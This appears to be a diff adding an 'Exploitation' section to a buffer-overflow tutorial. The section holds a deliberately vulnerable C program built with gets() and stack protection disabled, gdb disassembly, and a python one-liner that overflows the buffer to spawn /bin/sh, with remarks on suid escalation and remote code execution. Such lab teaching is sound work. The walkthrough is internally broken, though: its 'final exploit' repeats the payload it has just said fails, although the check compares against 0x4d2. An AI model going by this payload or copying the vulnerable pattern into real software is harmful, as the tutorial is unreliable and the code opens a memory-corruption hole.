@@ -103,3 +103,57 @@ gef➤  x/50wx $ebp
 ```
 
 At the address of `0xffffd1d8` - `0xffffd1e8` you can see our values 1, 2, 3, 4, 5, 6. But before them you can see the address `0x5655626b` which is just the address of the next assembly instruction after `some_func1` call. This is a return address, and the `ret` instruction will take it and place it in `eip` register which holds the address of the next instruction to execute.
+
+## Exploitation
+
+So, I wrote a simple program that has a part with a `system` unix syscall to execute `/bin/sh`. You need to compile it without a stack protection.
+
+```C
+#include <unistd.h>
+
+//  gcc buffer-overflow.c -o buffer-overflow -fno-stack-protector
+
+int main(int argc, char *argv[]){
+  char vuln_buff[100];
+  int access = 4321;
+  // vulnerable
+  gets(vuln_buff);
+  if (access == 1234){
+    system("/bin/sh");
+  }
+  return 0;
+}
+```
+
+Also, it used vulnerable function `gets`. But this is vulnerable because it doesn't check the input size. It may be also a programming mistake with `read`.
+Okay, we know the size of buffer, buf if we wouldn't know, then you can see it in the gdb:
+
+```bash
+0x0000000000001183 <+26>:	lea    rax,[rbp-0x70]
+0x0000000000001187 <+30>:	mov    rdi,rax
+0x000000000000118a <+33>:	mov    eax,0x0
+0x000000000000118f <+38>:	call   0x1070 <gets@plt>
+```
+
+Line `+26` shows you that for some reasons, buffer size in machine code is 112 bytes. So, you can exploit it:
+
+```bash
+gcc buf-overflow.c -o buffer-overflow -fno-stack-protector
+(python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
+```
+
+But, you don't get a shell, cause you overwritten the access variable with `0xdddd`. You can with what hex address it compares in the gdb:
+
+```bash
+   0x0000000000001194 <+43>:	cmp    DWORD PTR [rbp-0x4],0x4d2
+```
+
+So, your final exploit:
+
+```bash
+(python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
+```
+
+And you will get a shell, but you will be you, not the other user or root. Yeah, in this kind of program, the vulnerability is useless for an attacker, but if it has a `suid` bit set(`chmod ug+s buffer-overflow` as another user), he can get a root or another user privilege. But, if a program with some network interactions has this vulnerability, then the attacker can get Remote Code Execution or RCE, even if the program doesn't have a suid on root or other user. Also, the main reason for RCE here is condition which gives a shell, but even so, this vulnerability opens a thread to further exploitation.
+
+- [ ] Setup a virtual machine and put this program in its environment, then show the exploitation again.
